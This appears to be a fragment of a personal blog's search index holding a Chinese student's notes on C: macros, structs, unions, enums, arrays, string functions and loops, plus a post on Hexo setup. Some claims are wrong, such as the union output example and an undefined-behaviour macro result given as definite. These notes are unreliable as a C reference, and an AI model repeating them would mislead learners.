四.宏定义1.宏定义是指将一个标识符（又称为宏名）定义为一个字符串。在执行代码时，所有宏名的值都为该字符串。 2.宏定义不是c程序语言，不必在句尾加封号，且要在函数代码块外声明定义。 3.被双引号括起来的标识符（变量名）即使与宏名一样，也不会被宏定义替换。 4.使用带参宏定义时要注意，宏定义不会对形参进行计算，这就要注意形参参与加减乘除时的整体性，例如： 12345678910111213#include &lt;stdio.h&gt;#define square1(x) x*xint square (int x)&#123; return (x*x); &#125; int main() &#123; int m&#x3D;10; printf(&quot;10的平方为:%d&#x3D;%d\\n&quot;,square(10),square1(10)); printf(&quot;11的平方为:%d!&#x3D;%d\\n&quot;,square(10+1),square1(10+1)); printf(&quot;11的平方为:%d!&#x3D;%d\\n&quot;,square(++m),square1(++m)); return 0; &#125; 执行结果： 12310的平方为:100&#x3D;10011的平方为:121!&#x3D;2111的平方为:169!&#x3D;144 5.宏定义时，字符串可以是任何类型的数据。","tags":[{"name":"C语言学习","slug":"C语言学习","permalink":"http://example.com/tags/C%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0/"}]},{"title":"第四章汇总（3）","date":"2020-11-01T01:37:48.000Z","path":"2020/11/01/blog6/","text":"一.结构体 1.成员的类型可以是另一个结构体的类型，如：存在struct a b，即意味b是struct a型。 2.如果两个结构体的成员类型，名称，个数相同，但结构体名不同，也是两个不同的结构类型。 3.成员名可以和程序中的变量名相同，二者不代表同一对象。如：程序中可以定义“int num”，同时还可以在struct结构中定义”int num“。 4.初值内容用“{}”括起来，各组数据用“，”隔开，并且数据应与结构体类型定义时的成员个数相等，类型一致。 5.如果初值个数少于结构体成员个数，则自动为无初值的成员赋值0；若多余则编译错误。 二.新的关键词 1.const是C语言中的一个关键词，他限定一个变量不允许被改变。使用const在一定程度上提高程序的安全性和可靠性。 2.enum是枚举类型的引导字，用于声明枚举类型。 3.typedef用于声明一种新类型名来代替旧类型名。 三.共用体 1.共用体类型是一种多个不同类型共享储蓄空间的构造类型，即共用体变量的所有成员占同一个储蓄空间。 2.共用体变量所占空间的大小取决于占储蓄空间最大的成员，而不是各个成员的储蓄空间之和，这点是与结构体变量有着本质上的不同。 3.对共用体的某一成员赋值，会覆盖其他成员原来的数据，原来成员的值就不存在了，因此，共用体变量中起作用的是最后一次存入的成员变量的值。例如： x.a=10;x.b=20;printf(“%d%f”,x.a,x.b); 输出结果为：0 20.0 四.枚举类型 1.enum 语法格式： enum 枚举名 { 枚举值1[=整型常数1]，枚举值2[=整型常数2]…. }； 2.括号内的“=整型常数”可以省略。如果省略，编译程序按照顺序给每个枚举元素一个对应的整数值，整数值从0开始，后续元素顺序加1. 3.在C语言中，枚举变量的值不能直接进行输入和输出，只能间接地实现输出和输入的操作。例如使用switch（）语句。 4.不能把枚举常量对应的序号直接赋值给枚举变量。如枚举变量=1。 5.可以用强制类型转换为枚举变量赋值，如：枚举变量=（enum 枚举名）（1）。 五.自定义类型名 1.语法格式：typedef 类型名 新类型名 2.特别的，用typedef语法定义数组类型名，如：typedef int appay[10]//定义appay为有十个元素的整型数组类型名。","tags":[{"name":"C语言学习","slug":"C语言学习","permalink":"http://example.com/tags/C%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0/"}]},{"title":"第四章汇总（2）","date":"2020-10-31T12:00:08.000Z","path":"2020/10/31/blog5/","text":"一.字符数组 1.若不对字符数组进行初始化，则数组中各元素的值是不可预知的。 2.若花括号内提供的字符数组个数多余数组长度，则会产生编译错误的信息。 3.若花括号内提供的字符数组个数少余数组长度，则编译器将这些字符优先赋值给前面的元素，其余元素取值（’\\0’）。 4.用字符串常量直接赋值时，可省略花括号，用“”覆盖字符串常量。用字符常量逐个赋初值，时花括号不可省略，且各个字符由’’覆盖，字符间用逗号隔开。 5.C语言中，字符串是以字符’\\0’结尾，故它会额外占据数组一格内存。 6.使用%c格式说明符进行逐个字符的输入/输出；使用%s格式说明符进行字符串的输入/输出。 7.当一个字符表示为字符串变量名时，其本身就是该字符串的首地址，即scanf（）函数输入时无需再使加取地址符“&amp;”。 8.使用字符串函数时要在程序开头用“#include&lt;string.h&gt;”命令将头文件&lt;string.h&gt;包括进来。 9.引用字符要用“ ‘’ ”。 二.新函数 a 字符串复制函数strcpy（）； 用法：若strcpy（字符数组1，字符数组2），将字符串1/字符数组2连同结束标志’\\0’复制到字符数组1中。 b 字符串连续函数strcat（） ；用法：若strcpy（字符数组1，字符数组2），链接两个字符串，把字符串2连接到字符串1后面，再把得到的结果放在字符串1中。 c 字符串比较函数strcmp（） ； 用法：若strcmp（字符串1，字符串2） d 求字符串长度strlen（）；用法：若strlen（字符串），检测字符串中字符的个数，不包括’\\0’。 e 大写字母转换小写字母函数strlwr（）。 f 小写字母换号大写字母函数strupr（）。","tags":[{"name":"C语言学习","slug":"C语言学习","permalink":"http://example.com/tags/C%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0/"}]},{"title":"第四章汇总（1）","date":"2020-10-22T13:19:02.000Z","path":"2020/10/22/blog4/","text":"一. 一维数组 1.a 数组名不能与变量名一样；b 可以在定义变量名的同时定义数组； ​ c “[]”中的数据只能是整型常量，不能是变量，且若为整型常量即可在其中加减； ​ d 数组下标是从0开始的，且数组最后一个元素的下标为该数组元素个数减一； ​ e C语言中只能逐个使用数组中的元素，不能一次性引用多个元素，如：a[2]=1，意为将1的值赋值给该数组的第二个元素； ​ f 若未给数组中元素赋值，则其输出结果为不确定值； ​ g 当所赋初值个数多余该数组的元素个数时，在编译时出错，无结果；当所赋初值个数少于该数组的元素个数时，会自动给未赋值的元素赋值为0。 a 产生随机数：利用rand()函数，其原型为int rand(void)。要产生[n,m]范围内随机整数，要利用公式(int)(n+(m-n)*rand()/RAND_MAX) b 初始化随机数发生器：srand()，其函数原型为void srand(unsigned int seed)。seed是随机数种子，为了产生不可预见的随机数，通常用time(0)返回的值作为随机种子。而函数time(0)包含在头文件&lt;time.h&gt;中。 二. 二维数组 初始化二维数组时，可省略第一维的长度，但第二维长度不能忽略。 按顺序赋值并且省略第一维的长度时，数组第一维的大小按以下规则决定。设有n个初值数据，第二维长度为m，由于可能只对部分数据赋值，n/m不一定会被整除，因此第一维的大小通常为(int)(n/m+1). 矩阵转置：将一个二维数组的行和列元素进行互换。即将二维数组a中的第i行第j列元素赋给二位数组b中的第j行第i列。 三.字符串函数 strcmp(字符串1,字符串2) 用法：两个字符串自左向右一个个比对，直到出现不同的字符或遇到‘\\0’为止。（若字符串第一个字符比对就不同，那么即停止比对）。函数的返回值——a.若字符串1=字符串2，那么返回值为0；b.若字符串1&gt;字符串2，那么返回值为正整数；c.若字符串1&lt;字符串2，那么返回值为负整数。","tags":[{"name":"C语言学习","slug":"C语言学习","permalink":"http://example.com/tags/C%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0/"}]},{"title":"第三章汇总","date":"2020-10-18T08:15:25.000Z","path":"2020/10/18/blog3/","text":"1.if语句：只有当表达式成立时才会执行该if后的语句，且if与跟随语句之间无”;”隔开。 2.if-else语句:当存在多个if-else语句时，最近的if-else两两配对。 3.swich语句:a.switch()括号内的整型表达式也可以是字符型变量的表达式。 ​ b.当执行完某个语句组后遇到break，则跳出此switch结构，执行下一代码指令。 4.while语句:先进行条件判断，再执行循环语句。 while语句的一个小妙用，例如：(当a自减到0时即会停止循环) 12int a&#x3D;3;while(a) a--; 5.do-while语句:先执行循环语句，在进行条件判断。当遇到单独属于do-while结构中的break时会跳出do-while语句。 6.for语句:执行for(表达式1;表达式2;表达式3;)时，先执行表达式1和2，再执行循环体，最后执行表达式3。以此循环。 7.else-if语句：从表达式一开始计算，当遇到表达式n成立时，跳出该if镶嵌语句。 8.continue语句：结束本次循环，即不再执行continue后的代码，转入下一次循环的判断和执行。（但不会跳出该循环）","tags":[{"name":"C语言学习","slug":"C语言学习","permalink":"http://example.com/tags/C%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0/"}]},{"title":"近半个月学习总结","date":"2020-10-04T02:23:06.000Z","path":"2020/10/04/blog2/","text":"第一单元1.标识符： 其主要由字母，数字以及下划线组成，它的第一个字符必须是字母或下划线。2.”lf”为输出double数据时的修饰符。3.多输代码，熟练scanf，printf语句(基础函数)。4.printf函数输出时”c”表示输出单个字符，而”s”表示输出字符串。5.使用dev c++编写用对象流实现输入输出代码时，要注意头文件应表达为，且在int main()之前添加”using nemespce std”。6.C语言中关键字不能用作变量名。 7.scanf函数语句中不能对其进行格式化。如scanf（“%.3f”，&amp;a），这是错误格式。 8.注意除数！如一个数除2和除2.0得到的答案完全不同。除以2的话会当成整型变量运算，除以2.0的话则按照实型变量计算。 第二单元1.”/“运算，若除数与被除数均为整数型数据，则结果也为整数型。若要保留小数，则需用以下三种格式:”1.0/1”,”1/1.0”,”1.0/1.0”。2.”%”，操作数必须为整数，且运算结果答案与左侧数据符号一致。3.自增自减。a.无论运算符号在整型变量的前后，运算后该整型变量的值都相同。 b.运算符仅能用于整型变量，不能用于常量和表达式。4.关系运算符主导的表达式的结果只有”1”,”0”两种，即计算机只判断真伪。5.赋值运算符的左侧只能是变量，不能是常量和表达式。","tags":[{"name":"C语言学习","slug":"C语言学习","permalink":"http://example.com/tags/C%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0/"}]},{"title":"","date":"2020-10-01T13:32:41.724Z","path":"2020/10/01/blog1/","text":"title: “搭建的博客”date: 2020-10-01 21:32:41tags:description:1.用git bash进行hexo init指令时一定要认清楚文件夹，是对hexo文件夹进行格式化，我刚刚开始做的时候对blog文件夹一直做格式化导致耗费了很久时间2.在复制个人github地址后粘贴在congig时可能会混杂许多空格，这些空格会影响你执行hexo d指令，也就是说无法将本地文件部署到个人网页上 3.生产新博客：hexo new blogx 4.写blog的时候要使用编码UTF-8,否则传输到hexo网页上会显示乱码 5.用hexo g；hexo d指令上传博客时要在**hexo文件**下建立的hexo bash中输入。","tags":[]}]